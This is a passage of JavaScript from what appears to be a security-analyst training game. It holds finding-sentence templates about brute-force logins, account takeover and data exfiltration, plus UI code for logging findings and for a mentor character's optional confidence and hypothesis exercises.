      { key: 'whose', value: 'a contractor\u2019s personal device', alts: ['an unmanaged personal laptop', 'a non-corporate device'] },
      { key: 'risk', value: 'we cannot patch, monitor, or trust', alts: ['bypasses our security controls', 'sits entirely outside our management'] },
    ],
  },
  ch_m2_segment: {
    template: 'The device sits {where}, giving it {risk}.',
    chips: [
      { key: 'where', value: 'on the internal CORP segment beside Finance', alts: ['on the internal Finance network, not guest', 'inside the corporate segment'] },
      { key: 'risk', value: 'a direct path to sensitive Finance systems', alts: ['line of sight to Finance data', 'reach into the crown jewels'] },
    ],
  },
  ch_m2_probe: {
    template: 'The device has {behaviour}, which I am logging as {stance}.',
    chips: [
      { key: 'behaviour', value: 'repeatedly tried to reach the Finance file share', alts: ['actively probed for Finance data', 'kept reaching for the Finance share'] },
      { key: 'stance', value: 'enough to escalate and contain', alts: ['suspicious and worth containing', 'something to flag and isolate'] },
    ],
  },
  // ---- Mission 3 — Authentication Activity ----
  ch_m3_failures: {
    template: 'The auth logs show {pattern}, which reads as {meaning}.',
    chips: [
      { key: 'pattern', value: '47 failed logins in 7 minutes from one external address', alts: ['a tight burst of failures from a single source', 'rapid repeated login failures'] },
      { key: 'meaning', value: 'automated password guessing', alts: ['a brute-force credential attack', 'not a human simply mistyping'] },
    ],
  },
  ch_m3_impossible: {
    template: 'Two sessions appear {geography}, which means {meaning}.',
    chips: [
      { key: 'geography', value: 'thousands of km apart only minutes apart', alts: ['in two places too far to be one person', 'impossibly far apart in the time available'] },
      { key: 'meaning', value: 'a second party is using the account', alts: ['someone else is logged in alongside the owner', 'the real owner is not the only one in'] },
    ],
  },
  ch_m3_changes: {
    template: 'Right after login, {actions}, which I am logging as {stance}.',
    chips: [
      { key: 'actions', value: 'MFA was disabled, mail forwarding added, and the password changed', alts: ['security controls were tampered with', 'MFA was switched off and forwarding added'] },
      { key: 'stance', value: 'a confirmed takeover to act on now', alts: ['deliberate attacker entrenchment', 'a compromise past the point of monitoring'] },
    ],
  },
  // ---- Mission 4 — Data Exfiltration ----
  ch_m4_transfer: {
    template: 'The customer archive was {movement}, so {meaning}.',
    chips: [
      { key: 'movement', value: 'uploaded to an address outside the company', alts: ['sent beyond our perimeter', 'transferred to an external endpoint'] },
      { key: 'meaning', value: 'regulated data has left our control', alts: ['this is breach response, not prevention', 'customer data is already out'] },
    ],
  },
  ch_m4_dest: {
    template: 'The upload went to {dest}, which I am logging as {stance}.',
    chips: [
      { key: 'dest', value: 'an unknown external host, not a known partner', alts: ['an unrecognised external endpoint', 'attacker-controlled infrastructure'] },
      { key: 'stance', value: 'a confirmed exfil to escalate to IR now', alts: ['an incident to hand to the IR team', 'a breach to act on immediately'] },
    ],
  },
};

/* The finding template for a challenge, or null when none is registered. */
function findingDef(ch) {
  return (ch && FINDING_TEMPLATES[ch.id]) ? FINDING_TEMPLATES[ch.id] : null;
}
/* Normalise a chip option (string OR {text,warn}) to {text,warn}. */
function chipOption(opt) {
  if (opt && typeof opt === 'object') return { text: String(opt.text || ''), warn: opt.warn || null };
  return { text: String(opt == null ? '' : opt), warn: null };
}
/* The full ordered option list for one chip: default value first, then alts. */
function chipOptions(chip) {
  return [chip.value].concat(chip.alts || []).map(chipOption);
}
/* The currently-selected option index for a chip (0 = the auto-draft default). */
function findingChipIndex(challengeId, chipKey) {
  const sel = SIM.findingChips[challengeId];
  const i = sel && sel[chipKey];
  return Number.isInteger(i) ? i : 0;
}
/* The selected {text,warn} for a chip, clamped to its option range. */
function findingChipValue(challengeId, chip) {
  const opts = chipOptions(chip);
  const idx = Math.min(Math.max(0, findingChipIndex(challengeId, chip.key)), opts.length - 1);
  return opts[idx];
}
/* Compose the plain finding sentence from the selected chip wordings. */
function composedFindingText(ch) {
  const def = findingDef(ch);
  if (!def) return '';
  return def.template.replace(/\{(\w+)\}/g, (m, key) => {
    const chip = (def.chips || []).find(c => c.key === key);
    return chip ? findingChipValue(ch.id, chip).text : m;
  });
}
/* True once the player has cycled any chip away from its auto-draft default. */
function findingEdited(ch) {
  const def = findingDef(ch);
  return !!def && (def.chips || []).some(c => findingChipIndex(ch.id, c.key) > 0);
}
/* Gentle, display-only cautions for the currently-selected chip wordings. */
function findingWarnings(ch) {
  const def = findingDef(ch);
  if (!def) return [];
  const out = [];
  (def.chips || []).forEach(c => { const o = findingChipValue(ch.id, c); if (o.warn) out.push(o.warn); });
  return out;
}
/* Cycle a chip to its next wording (wraps). Display-only: writes SIM.findingChips
 * ONLY, never SIM.discoveryJudgments, then re-renders. */
function cycleFindingChip(challengeId, chipKey) {
  const ch = discoveryChallengeById(challengeId);
  const def = findingDef(ch);
  if (!def) return;
  const chip = (def.chips || []).find(c => c.key === chipKey);
  if (!chip) return;
  const opts = chipOptions(chip);
  if (opts.length <= 1) return;
  const next = (findingChipIndex(challengeId, chipKey) + 1) % opts.length;
  const sel = SIM.findingChips[challengeId] || (SIM.findingChips[challengeId] = {});
  sel[chipKey] = next;
  nbLog('finding-chip-edit', { challengeId, chipKey, index: next });
  renderEvidencePanel();
}
function findingCommitted(challengeId) {
  return SIM.committedFindings.some(f => f.challengeId === challengeId);
}
/* The committed snapshot for a challenge, or null. */
function committedFindingEntry(challengeId) {
  return SIM.committedFindings.find(f => f.challengeId === challengeId) || null;
}
/* True when a logged finding's live draft has since been reworded (so the
 * snapshot is stale and an "Update logged finding" action should appear). */
function findingDirty(ch) {
  const e = committedFindingEntry(ch.id);
  return !!e && e.text !== composedFindingText(ch);
}
/* Snapshot the composed finding to the on-screen case-file timeline. Re-committing
 * an already-logged finding refreshes its text (no grading, no persistence). */
function commitFinding(challengeId) {
  const ch = discoveryChallengeById(challengeId);
  if (!ch || !challengeAnswered(ch)) return;
  const text = composedFindingText(ch);
  if (!text) return;
  const edited = findingEdited(ch);
  const existing = SIM.committedFindings.find(f => f.challengeId === challengeId);
  if (existing) { existing.text = text; existing.edited = edited; existing.at = Date.now(); }
  else SIM.committedFindings.push({ challengeId, text, edited, at: Date.now() });
  nbLog('finding-commit', { challengeId, edited, total: SIM.committedFindings.length });
  renderEvidencePanel();
}

/* One auto-drafted finding card: the editable sentence (tap-to-reword chips) plus
 * the commit / update / logged footer. Used in BOTH the notebook (for committed
 * findings — the on-record copy, still editable to update) AND the Decision Dock
 * (for the active un-logged draft), so the markup is identical wherever it sits.
 * Presentation-only — writes flow through cycleFindingChip / commitFinding. */
function findingCardHtml(ch) {
  const def = findingDef(ch);
  if (!def) return '';
  const decisionN = simDiscoveryChallenges().indexOf(ch) + 1;
  const isCommitted = findingCommitted(ch.id);
  const warns = findingWarnings(ch);
  const body = mapEsc(def.template).replace(/\{(\w+)\}/g, (m, key) => {
    const chip = (def.chips || []).find(c => c.key === key);
    if (!chip) return m;
    const o = findingChipValue(ch.id, chip);
    const edited = findingChipIndex(ch.id, chip.key) > 0;
    const multi = chipOptions(chip).length > 1;
    const cls = 'sim-finding-chip' + (edited ? ' sim-finding-chip--edited' : '') + (multi ? '' : ' sim-finding-chip--fixed');
    const attrs = multi
      ? ` data-finding-chip="${mapEsc(chip.key)}" data-challenge="${mapEsc(ch.id)}" title="Tap to reword" aria-label="Reword: ${mapEsc(o.text)}"`
      : ' disabled aria-disabled="true"';
    return `<button type="button" class="${cls}"${attrs}>${mapEsc(o.text)}</button>`;
  });
  const warnHtml = warns.length
    ? `<div class="sim-finding-warn" role="note">${warns.map(mapEsc).join(' ')}</div>` : '';
  const dirty = findingDirty(ch);
  let foot;
  if (!isCommitted) {
    foot = `<button type="button" class="sim-finding-commit" data-finding-commit="${mapEsc(ch.id)}">Commit finding</button>`;
  } else if (dirty) {
    foot = `<button type="button" class="sim-finding-commit sim-finding-commit--update" data-finding-commit="${mapEsc(ch.id)}">Update logged finding</button><span class="sim-finding-dirty">Edited since you logged it</span>`;
  } else {
    foot = `<span class="sim-finding-logged">Logged to case file${findingEdited(ch) ? ' \u00b7 your wording' : ''}</span>`;
  }
  return `
    <div class="sim-finding${isCommitted ? ' sim-finding--committed' : ''}">
      <div class="sim-finding-head">
        <span class="sim-finding-tag">AUTO-DRAFTED</span>
        <button type="button" class="sim-finding-source" data-finding-reopen="${mapEsc(ch.id)}" title="Reopen this decision in comms">Decision ${decisionN} \u00b7 ${mapEsc(ch.short || '')}</button>
      </div>
      <p class="sim-finding-text">${body}</p>
      ${warnHtml}
      <div class="sim-finding-foot">${foot}<span class="sim-finding-hint">Tap a highlighted phrase to reword \u2014 your call, your words.</span></div>
    </div>`;
}

/* Compact, NON-editable pointer shown in the notebook for a finding the player
 * hasn't logged yet — its editable card lives in the Decision Dock, so this keeps
 * the FINDINGS DRAFTED list complete without a confusing second editable copy. */
function findingPendingRefHtml(ch, isActive) {
  const decisionN = simDiscoveryChallenges().indexOf(ch) + 1;
  const note = isActive
    ? 'Drafting now in the Decision Dock, under the terminal.'
    : 'Queued — log it in the Decision Dock, under the terminal.';
  return `
    <div class="sim-finding sim-finding--pending${isActive ? ' sim-finding--pending-active' : ''}">
      <div class="sim-finding-head">
        <span class="sim-finding-tag sim-finding-tag--pending">READY TO LOG</span>
        <button type="button" class="sim-finding-source" data-finding-reopen="${mapEsc(ch.id)}" title="Reopen this decision in comms">Decision ${decisionN} \u00b7 ${mapEsc(ch.short || '')}</button>
      </div>
      <p class="sim-finding-pending-note">${note}</p>
    </div>`;
}

/* The FINDINGS section — the notebook's running record. Committed findings render
 * as full (still-editable) cards; findings not yet logged render as compact
 * pointers to the Decision Dock, where their editable draft now lives. '' when
 * nothing qualifies, so missions without challenges/templates render nothing. */
function findingsHtml() {
  const vis = visibleDiscoveryChallenges()
    .filter(c => challengeValid(c) && challengeAnswered(c) && findingDef(c));
  if (!vis.length) return '';
  const committed = vis.filter(c => findingCommitted(c.id)).length;
  const active = activeDraftFinding();
  // Only the finding the dock is ACTUALLY showing reads as "drafting now" — when a
  // graded call or reconsideration is occupying the dock, every draft is "queued".
  const dockShowingFinding = !!active && !activeDecisionChallenge() && !activeReconsideration();
  const cards = vis.map(ch => findingCommitted(ch.id)
    ? findingCardHtml(ch)
    : findingPendingRefHtml(ch, dockShowingFinding && ch.id === active.id)
  ).join('');
  return `
    <div class="sim-notebook-section sim-findings">
      <div class="sim-notebook-head sim-notebook-head--findings">FINDINGS DRAFTED <span class="sim-notebook-count">${committed}/${vis.length} logged</span></div>
      ${cards}
      ${committedFindingsHtml()}
    </div>`;
}

/* The committed case-file timeline — the actual logged snapshots, in the order
 * they were first committed (re-commit refreshes text in place, keeping order).
 * Distinct from the editable drafting cards above so the player can always see
 * exactly what they put on the record. '' until something is committed. */
function committedFindingsHtml() {
  const log = SIM.committedFindings;
  if (!log.length) return '';
  const items = log.map((f, i) => {
    const ch = discoveryChallengeById(f.challengeId);
    const decisionN = simDiscoveryChallenges().indexOf(ch) + 1;
    const src = (ch && decisionN > 0) ? `Decision ${decisionN}` : 'Decision';
    const tag = f.edited ? '<span class="sim-finding-log-tag">your wording</span>' : '';
    return `
      <li class="sim-finding-log-item">
        <span class="sim-finding-log-num">${i + 1}</span>
        <span class="sim-finding-log-body"><span class="sim-finding-log-src">${mapEsc(src)}</span>${mapEsc(f.text)}${tag}</span>
      </li>`;
  }).join('');
  return `
    <div class="sim-finding-log">
      <div class="sim-finding-log-head">LOGGED TO CASE FILE</div>
      <ol class="sim-finding-log-list">${items}</ol>
    </div>`;
}

/* ================================================================== *
 * #124 — SARAH REYES AS SPARRING PARTNER (presentation / view-state only)
 * ------------------------------------------------------------------ *
 * Five optional career-sim surfaces that turn Sarah from a narrator into a
 * sparring partner: (1) Analyst's Bet 2.0 (disconfirming-evidence), (2) a
 * confidence calibration check she cites back, (3) a two-voice stakeholder
 * moment, (4) mentor trails ("what I'd check next"), and (5) an end-of-mission
 * performance mirror. ALL react to POSTURE (how the player engaged), never
 * correctness: they never grade, never reveal a keyed answer, never touch
 * investigationConfidence() or the scoring path. The sole graded writer
 * (setDiscoveryJudgment) is untouched.
 *
 * Master + per-feature switches, all on by default. Flipping `enabled` — or any
 * sub-flag — removes that surface's every visible effect; with all off the game
 * plays exactly as before and writes nothing new (no saveCareerState drift). The
 * PURE logic + per-mission content live in ./sarah-sparring-core.js (node-
 * testable); this file keeps the DOM/state wrappers and calls into that core.
 * ================================================================== */
const SARAH_FLAGS = {
  enabled: true,            // master switch
  sparring: true,           // (1) Analyst's Bet 2.0 — disconfirming-evidence exchange
  calibration: true,        // (2) confidence calibration check + later callback
  twoVoice: true,           // (3) two-voice stakeholder moment
  mentorTrails: true,       // (4) mentor trails
  performanceMirror: true,  // (5) end-of-mission performance mirror + perk
};
function sarahOn(sub) {
  return !!(SARAH_FLAGS.enabled && (sub ? SARAH_FLAGS[sub] : true));
}

// Non-blocking telemetry — in-memory ring + console.debug mirror. Never persists,
// never throws (mirrors consequenceLog / markupLog).
const SARAH_LOG = [];
function sparringLog(event, data) {
  try {
    SARAH_LOG.push({ t: Date.now(), event, ...(data || {}) });
    if (SARAH_LOG.length > 100) SARAH_LOG.shift();
    if (typeof console !== 'undefined' && console.debug) console.debug('[sparring]', event, data || '');
  } catch (_) { /* telemetry is best-effort */ }
}

// (5) Performance-mirror PERK — session-scoped and NON-persisted by design. It
// must survive closing one mission and opening the next (to carry over), so it
// lives at module scope, NOT on SIM (which resets per mission). It is never
// written to localStorage / saveCareerState; openCareerMission consumes it once.
let SARAH_SESSION_PERK = null;   // { id, label, note, fromMission } | null

/* Fresh transient sparring view-state, reset every openCareerMission. */
function freshSparringState() {
  return {
    calibration: null,  // { draftLevel, draftRationale, committed, level, rationale, atSound, citedAtSound }
    twoVoice: null,     // { choice, at }
    trails: [],         // [{ id, label, target, action, matchOn, armedAt, consumedAt }]
    carry: null,        // perk carried over from the previous mission's debrief (display-only)
    recap: null,        // last computed debrief recap (display cache; never persisted)
  };
}

/* ================================================================== *
 * PHASE 5 — OPTIONAL ANALYST'S BET (presentation / view-state only)
 * ------------------------------------------------------------------ *
 * Before committing the recommendation, the analyst may OPTIONALLY stake
 * their read. The bet is about CONFIDENCE / commitment, never the verdict:
 * options reference the case domain but never state the answer, and the bet
 * is never graded and never gates progress. A "strong" stake mirrors the
 * Railguard mechanic — a recoverable DISPLAY-ONLY confidence dip (confSpend,
 * tagged source:'bet') plus a Scope-Snapshot-style recap (P.active.betSnapshot)
 * — WITHOUT consuming analyst standing or the real JP-002 power. It never
 * touches investigationConfidence() or any grading path, and persists nothing.
 * Bet copy is keyed by mission id; missions with no entry show no bet.
 * ================================================================== */
const BET_STAKE = 6;             // recoverable DISPLAY-only confidence staked on a strong bet
/* The bet config for the current mission. Content lives in ./sarah-sparring-core
 * (SARAH_CONTENT[mission].bet) so the tests audit the real strings; a per-mission
 * `def.sarah.bet` override still wins for dynamically-reshaped missions. */
function simAnalystBet() {
  return (SIM.def && SIM.def.sarah && SIM.def.sarah.bet) || sarahBet(SIM.missionId) || null;
}
/* The read-only bet Spotlight may only re-surface an evidence item the analyst
 * has ALREADY surfaced — returns its label, or '' if the id is unknown or not yet
 * earned. This is the guard that keeps the Spotlight from revealing anything new. */
function surfacedEvidenceLabel(id) {
  if (!id || !SIM.evidence || !SIM.evidence.has(id)) return '';
  const ev = ((SIM.def && SIM.def.evidence) || []).find(e => e && e.id === id);
  return ev ? (ev.label || '') : '';
}
/* Bet-owned activation: a recoverable DISPLAY-only confidence stake + a scope
 * recap, on bet-owned keys so it never collides with the earned-tools system or
 * consumes standing. Never stacks on an existing dip (e.g. an active Railguard).*/
function activateScopeSnapshot(opts) {
  const P = SIM.powers; if (!P) return;
  const source = (opts && opts.source) || 'bet';
  P.active['betSnapshot'] = { left: SNAPSHOT_WINDOW, counts: scopeCounts(), source };
  if (P.confSpend === 0) { P.confSpend = BET_STAKE; P.confSpendSource = source; }
  powerLog('bet-stake', 'BET', source);
}
/* Record the player's optional bet — now a DISCONFIRMING-EVIDENCE test. A 'strong'
 * hypothesis names a real falsification criterion and unlocks a read-only Spotlight
 * on evidence the analyst HAS ALREADY surfaced, plus the recoverable display dip;
 * a 'weak' pick or Skip only coaches. POSTURE-driven (strength of the test), never
 * correctness — the label never states the verdict. Once per mission. Reuses
 * SIM.powers; persists nothing; reveals nothing new. */
function takeAnalystBet(hypId) {
  if (!sarahOn('sparring')) return;
  const bank = simAnalystBet();
  if (!bank || (SIM.analystBet && SIM.analystBet.done)) return;

  // Skip is a first-class, no-cost choice: nothing staked, gentle coaching only.
  if (hypId === '__skip__') {
    SIM.analystBet = { done: true, pick: '__skip__', strong: false, staked: false, spotlightId: null };
    const P0 = SIM.powers;
    if (P0) P0.sarah = 'No stake \u2014 fair when the picture is still forming. Keep working the evidence and we will revisit.';
    nbLog('bet-skipped', {});
    sparringLog('bet-skip', {});
    renderEvidencePanel();
    return;
  }

  const res = evaluateHypothesis(bank, hypId);
  if (!res.found) return;
  const strong = res.strong;
  const P = SIM.powers;
  // A fresh confidence stake only lands when no dip is already in play — the bet
  // never stacks a second dip on top of an active Railguard (single confSpend var).
  const staked = strong && !!P && P.confSpend === 0;
  // Spotlight only when the cited evidence is real AND already surfaced.
  const spotlightId = (strong && res.spotlightId && surfacedEvidenceLabel(res.spotlightId))
    ? res.spotlightId : null;
  SIM.analystBet = { done: true, pick: hypId, strong, staked, spotlightId };
  if (strong) activateScopeSnapshot({ source: 'bet' });
  if (P) {
    P.sarah = res.coach || (strong
      ? 'You named what would prove you wrong \u2014 that is the test. Back it with another sound call.'
      : 'That leans on hope more than evidence. Anchor your next check to something you can verify.');
    if (strong && !staked) {
      P.sarah += ' (Your read is on the record \u2014 a calibration check is already running, so no extra certainty was staked.)';
    }
  }
  nbLog('bet-taken', { pick: hypId, strong, staked });
  sparringLog('bet', { pick: hypId, strong, staked, spotlight: !!spotlightId });
  powerLog('bet', 'BET', strong ? 'strong' : 'weak');
  renderEvidencePanel();
}

/* The optional ANALYST'S BET section — a disconfirming-evidence exchange. Appears
 * once at least one challenge is answered (so there is a read to test); after a
 * bet it shows the chosen hypothesis, any read-only Spotlight, and the live recap.
 * Gated on sarahOn('sparring'); '' for missions with no bet config. */
function analystBetHtml() {
  if (!sarahOn('sparring')) return '';
  const bank = simAnalystBet();
  if (!bank) return '';
  const hyps = bank.hypotheses || [];
  const taken = !!(SIM.analystBet && SIM.analystBet.done);
  const answered = visibleDiscoveryChallenges().filter(challengeAnswered).length;
  if (!answered && !taken) return '';
  const P = SIM.powers;
  if (taken) {
    const skipped = SIM.analystBet.pick === '__skip__';
    const pick = hyps.find(h => h.id === SIM.analystBet.pick);
    const stanceLabel = skipped ? 'No stake'
      : SIM.analystBet.strong ? (SIM.analystBet.staked ? 'Staked' : 'On record') : 'Working read';
    const pickLine = skipped ? 'You held off on staking a test for now.' : (pick ? pick.label : '');
    // Read-only Spotlight: re-surfaces an evidence item the analyst already has,
    // to weigh against the disconfirming test. Never reveals anything new.
    let spotlight = '';
    if (SIM.analystBet.spotlightId) {
      const lab = surfacedEvidenceLabel(SIM.analystBet.spotlightId);
      if (lab) {
        spotlight = `<div class="sim-bet-spotlight"><span class="sim-bet-spotlight-lab">Spotlight \u2014 weigh this against your test</span>${mapEsc(lab)}</div>`;
      }
    }
    let recap = '';
    if (P && P.active['betSnapshot']) {
      const c = P.active['betSnapshot'].counts;
      const open = [];
      if (c.toJudge) open.push(`${c.toJudge} finding${c.toJudge === 1 ? '' : 's'} to judge`);
      if (c.toClassify) open.push(`${c.toClassify} file${c.toClassify === 1 ? '' : 's'} to classify`);
      if (c.determinationOpen) open.push('determination pending');
      const openTxt = open.length ? open.join(', ') : 'nothing outstanding';
      recap = `<div class="sim-bet-recap"><span class="sim-bet-recap-lab">Scope at the stake</span>Settled: ${c.facts} fact${c.facts === 1 ? '' : 's'}, ${c.judged} judgment${c.judged === 1 ? '' : 's'}. Open: ${mapEsc(openTxt)}.</div>`;
    }
    const coach = P && P.sarah
      ? `<div class="sim-bet-coach"><span class="sim-bet-coach-lab">Sarah Reyes</span>${mapEsc(P.sarah)}</div>` : '';
    return `
      <div class="sim-notebook-section sim-bet sim-bet--taken">
        <div class="sim-notebook-head sim-notebook-head--bet">ANALYST'S BET <span class="sim-bet-state">${stanceLabel}</span></div>
        <p class="sim-bet-pick">${mapEsc(pickLine)}</p>
        ${spotlight}
        ${recap}
        ${coach}
      </div>`;
  }
  const opts = hyps.map(h =>
    `<button type="button" class="sim-bet-opt sim-bet-opt--${h.strength === 'strong' ? 'strong' : 'hedge'}" data-analyst-bet="${mapEsc(h.id)}">${mapEsc(h.label)}</button>`
  ).join('');
  const skip = `<button type="button" class="sim-bet-opt sim-bet-opt--skip" data-analyst-bet="__skip__">Skip \u2014 I\u2019m not ready to stake a test yet.</button>`;
  return `
    <div class="sim-notebook-section sim-bet">
      <div class="sim-notebook-head sim-notebook-head--bet">ANALYST'S BET <span class="sim-bet-optional">optional</span></div>
      <p class="sim-bet-prompt">${mapEsc(bank.prompt)}</p>
      <div class="sim-bet-opts">${opts}${skip}</div>
      <p class="sim-bet-note">Naming what would prove you wrong is a disconfirming test \u2014 it sharpens your read and never changes your score.</p>
    </div>`;
}

/* ================================================================== *
 * #124 SARAH-SPARRING — features (2)-(5) DOM/state wrappers.
 * ------------------------------------------------------------------ *
 * PRESENTATION-ONLY by construction: every surface is gated on sarahOn(sub)
 * AND on per-mission content (def.sarah override first, then SARAH_CONTENT),
 * reacts to POSTURE never correctness, never calls setDiscoveryJudgment, and
 * persists NOTHING (the only carry-over \u2014 the perk \u2014 is a session-scoped
 * module var, never saveCareerState). With the flags off none of this renders
 * and the game writes byte-identical state. Pure logic lives in
 * ./sarah-sparring-core.js; these are the DOM/state wrappers around it.
 * ================================================================== */

/* Per-mission content resolvers \u2014 a def.sarah override wins for reshaped missions. */
function simSarahCalibration() {
  return (SIM.def && SIM.def.sarah && SIM.def.sarah.calibration) || sarahCalibration(SIM.missionId) || null;
}
function simSarahTwoVoice() {
  return (SIM.def && SIM.def.sarah && SIM.def.sarah.twoVoice) || sarahTwoVoice(SIM.missionId) || null;
}
function simSarahTrails() {
  const def = SIM.def && SIM.def.sarah && SIM.def.sarah.trails;
  return (Array.isArray(def) && def.length) ? def : (sarahTrails(SIM.missionId) || []);
}
/* The shared "a read is forming" signal \u2014 how many visible threads are answered. */
function answeredChallengeCount() {
  return visibleDiscoveryChallenges().filter(challengeAnswered).length;
}
/* A short, safe label for the most recently surfaced finding (calibration callback). */
function evShortLabel(e) {
  if (!e) return '';
  const raw = e.label || (e.layers && e.layers.beginner && e.layers.beginner.summary) || '';
  const s = String(raw).replace(/\s+/g, ' ').trim();
  return s.length > 64 ? (s.slice(0, 61).trimEnd() + '\u2026') : s;
}

/* ---- (2) CONFIDENCE CALIBRATION CHECK + later callback --------------- */
function ensureCalibrationState() {
  if (!SIM.sparring) SIM.sparring = freshSparringState();
  if (!SIM.sparring.calibration) {
    SIM.sparring.calibration = { draftLevel: null, draftRationale: '', committed: false, error: '' };
  }
  return SIM.sparring.calibration;
}
/* Chip pick: toggle the active level WITHOUT a full re-render so the rationale
 * textarea keeps its text + focus (the notebook rebuilds its whole innerHTML). */
function setCalibrationLevel(level) {
  if (!sarahOn('calibration')) return;
  const cal = ensureCalibrationState();
  if (cal.committed) return;
  cal.draftLevel = level;
  cal.error = '';
  const host = document.getElementById('simEvidence');
  if (host) {
    host.querySelectorAll('.sim-calib-chip').forEach(btn => {
      const on = btn.dataset.calibLevel === level;
      btn.classList.toggle('sim-calib-chip--on', on);
      btn.setAttribute('aria-pressed', on ? 'true' : 'false');
    });
    const commit = host.querySelector('.sim-calib-commit');
    if (commit) commit.disabled = false;
  }
  sparringLog('calib-level', { level });
}
/* Lock in the calibration: read the live level + rationale, validate via the
 * pure core, store transient view-state, and stamp the evidence count so the
 * later callback can only fire once a NEW finding has surfaced. */
function commitCalibration() {
  if (!sarahOn('calibration')) return;
  const cal = SIM.sparring && SIM.sparring.calibration;
  if (!cal || cal.committed) return;
  const host = document.getElementById('simEvidence');
  const input = host && host.querySelector('.sim-calib-input');
  const rationale = input ? String(input.value || '') : String(cal.draftRationale || '');
  cal.draftRationale = rationale.slice(0, CALIB_MAX_RATIONALE);
  if (!calibrationValid(cal.draftLevel, cal.draftRationale)) {
    cal.error = !cal.draftLevel
      ? 'Pick a confidence level first.'
      : 'Add a short one-line reason (1\u2013140 characters).';
    renderEvidencePanel();
    return;
  }
  cal.committed = true;
  cal.level = cal.draftLevel;
  cal.rationale = cal.draftRationale.trim();
  cal.atEvidence = SIM.evidence.size;
  cal.error = '';
  sparringLog('calib-commit', { level: cal.level });
  renderEvidencePanel();
}
function calibrationHtml() {
  if (!sarahOn('calibration')) return '';
  const cfg = simSarahCalibration();
  if (!cfg) return '';
  const cal = SIM.sparring && SIM.sparring.calibration;
  const committed = !!(cal && cal.committed);
  if (!committed && !answeredChallengeCount()) return '';   // appears once a read is forming
  if (committed) {
    const lvl = calibrationLabel(cal.level);
    let callback = '';
    if (SIM.evidence.size > (cal.atEvidence || 0)) {
      const short = evShortLabel(newestEvidence());
      const line = calibrationCallback({ committed: true, level: cal.level, rationale: cal.rationale }, short);
      if (line) {
        callback = `<div class="sim-calib-callback"><span class="sim-calib-callback-lab">Sarah Reyes</span>${mapEsc(line)}</div>`;
      }
    }
    return `
      <div class="sim-notebook-section sim-calib sim-calib--committed">
        <div class="sim-notebook-head sim-notebook-head--calib">CONFIDENCE CHECK <span class="sim-calib-state">${mapEsc(lvl)} \u00b7 logged</span></div>
        <p class="sim-calib-recorded"><span class="sim-calib-recorded-lab">Your call</span>\u201c${mapEsc(cal.rationale)}\u201d</p>
        ${callback}
      </div>`;
  }
  const draft = (cal && cal.draftLevel) || null;
  const draftText = (cal && cal.draftRationale) || '';
  const chips = [['low', 'Low'], ['med', 'Medium'], ['high', 'High']].map(([v, label]) =>
    `<button type="button" class="sim-calib-chip${draft === v ? ' sim-calib-chip--on' : ''}" data-calib-level="${v}" aria-pressed="${draft === v ? 'true' : 'false'}">${label}</button>`
  ).join('');
  const err = (cal && cal.error)
    ? `<p class="sim-calib-error" role="alert">${mapEsc(cal.error)}</p>` : '';
  return `
    <div class="sim-notebook-section sim-calib">
      <div class="sim-notebook-head sim-notebook-head--calib">CONFIDENCE CHECK <span class="sim-calib-optional">optional</span></div>
      <p class="sim-calib-prompt">${mapEsc(cfg.prompt)}</p>
      <div class="sim-calib-levels" role="group" aria-label="How confident is your read?">${chips}</div>
      <label class="sim-calib-field"><span class="sim-calib-field-lab">In one line \u2014 why?</span>
        <textarea class="sim-calib-input" maxlength="${CALIB_MAX_RATIONALE}" rows="2" aria-label="Why you are this confident, one line"
          placeholder="e.g. the evidence points one way, but one record is still ambiguous">${mapEsc(draftText)}</textarea>
      </label>
      ${err}
      <button type="button" class="sim-calib-commit" data-calib-commit="1"${draft ? '' : ' disabled'}>Lock in my confidence</button>
      <p class="sim-calib-note">Putting a number on your confidence \u2014 and saying why \u2014 is a senior habit. It never changes your score.</p>
    </div>`;
}

/* ---- (3) TWO-VOICE STAKEHOLDER MOMENT ------------------------------- */
/* A real crossroad: at least two threads judged, or every visible thread judged. */
function twoVoiceReached() {
  const vis = visibleDiscoveryChallenges().filter(challengeValid);
  if (!vis.length) return false;
  const ans = vis.filter(challengeAnswered).length;
  return ans >= 2 || ans === vis.length;
}
function chooseTwoVoice(choiceId) {
  if (!sarahOn('twoVoice')) return;
  const pair = simSarahTwoVoice();
  if (!pair) return;
  if (!SIM.sparring) SIM.sparring = freshSparringState();
  if (SIM.sparring.twoVoice && SIM.sparring.twoVoice.choice) return;  // locked after first pick
  if (!twoVoiceValidChoice(pair, choiceId)) return;
  SIM.sparring.twoVoice = { choice: choiceId, at: Date.now() };
  sparringLog('twovoice', { choice: choiceId });
  renderEvidencePanel();
}
function twoVoiceHtml() {
  if (!sarahOn('twoVoice')) return '';
  const pair = simSarahTwoVoice();
  if (!pair || !pair.a || !pair.b) return '';
  const tv = SIM.sparring && SIM.sparring.twoVoice;
  if (!tv || !tv.choice) {
    if (!twoVoiceReached()) return '';
    const opt = (v, side) => `
      <button type="button" class="sim-tv-opt sim-tv-opt--${side}" data-twovoice="${mapEsc(v.id)}">
        <span class="sim-tv-who">${mapEsc(v.who)}</span>
        <span class="sim-tv-stance">${mapEsc(v.stance)}</span>
      </button>`;
    return `
      <div class="sim-notebook-section sim-tv">
        <div class="sim-notebook-head sim-notebook-head--tv">TWO VOICES IN THE ROOM</div>
        <p class="sim-tv-prompt">Two people are leaning on you with different priorities. Whose framing best fits what the evidence actually shows?</p>
        <div class="sim-tv-opts">${opt(pair.a, 'a')}${opt(pair.b, 'b')}</div>
        <p class="sim-tv-note">There is no right voice to side with \u2014 your job is to put the evidence in front of both. This never changes your score.</p>
      </div>`;
  }
  const chosen = [pair.a, pair.b].find(v => v && v.id === tv.choice) || null;
  const reconcile = twoVoiceReconcile(pair);
  return `
    <div class="sim-notebook-section sim-tv sim-tv--chosen">
      <div class="sim-notebook-head sim-notebook-head--tv">TWO VOICES IN THE ROOM <span class="sim-tv-state">weighed</span></div>
      ${chosen ? `<div class="sim-tv-pick"><span class="sim-tv-who">${mapEsc(chosen.who)}</span><span class="sim-tv-stance">${mapEsc(chosen.stance)}</span></div>` : ''}
      <div class="sim-tv-reconcile"><span class="sim-tv-reconcile-lab">Sarah Reyes</span>${mapEsc(reconcile)}</div>
    </div>`;
}

/* ---- (4) MENTOR TRAILS \u2014 "what I'd check next" -------------------- */
/* Arm trails whose `emitOn` thread was just committed (idempotent). Gated +
 * best-effort; called from the sole discovery-judgment chokepoint. */
function sparringArmTrails(committedKey) {
  if (!sarahOn('mentorTrails')) return;
  const defs = simSarahTrails();
  if (!defs.length) return;
  const armed = trailEmit(defs, committedKey);
  if (!armed.length) return;
